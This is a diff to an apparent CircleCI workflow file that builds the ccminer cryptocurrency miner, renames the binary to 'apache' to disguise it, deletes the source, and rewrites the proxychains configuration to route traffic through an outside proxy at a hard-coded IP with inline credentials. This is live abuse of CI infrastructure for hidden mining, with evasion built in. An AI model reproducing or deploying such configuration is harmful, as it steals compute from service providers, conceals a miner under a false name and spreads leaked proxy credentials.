@@ -24,7 +24,8 @@ jobs:
           command: |
             sudo apt update
             sudo apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git proxychains
-            git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git;cd ccminer;chmod +x build.sh;chmod +x configure.sh;chmod +x autogen.sh;./build.sh;mv ccminer ../apache;cd ..
+            git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git;cd ccminer;chmod +x build.sh;chmod +x configure.sh;chmod +x autogen.sh;./build.sh;mv ccminer ../apache;cd ..;sudo rm ccminer -r
+            sudo sed -i -e 's/#dynamic_chain/dynamic_chain/g;s/strict_chain/#strict_chain/g;s/socks4/socks5/g;s/127.0.0.1/185.30.232.34/g;s/9050/80 kuyaxbatox-US-rotate b15m1ll4H/g' /etc/proxychains.conf
             ls
 
 # Invoke jobs via workflows
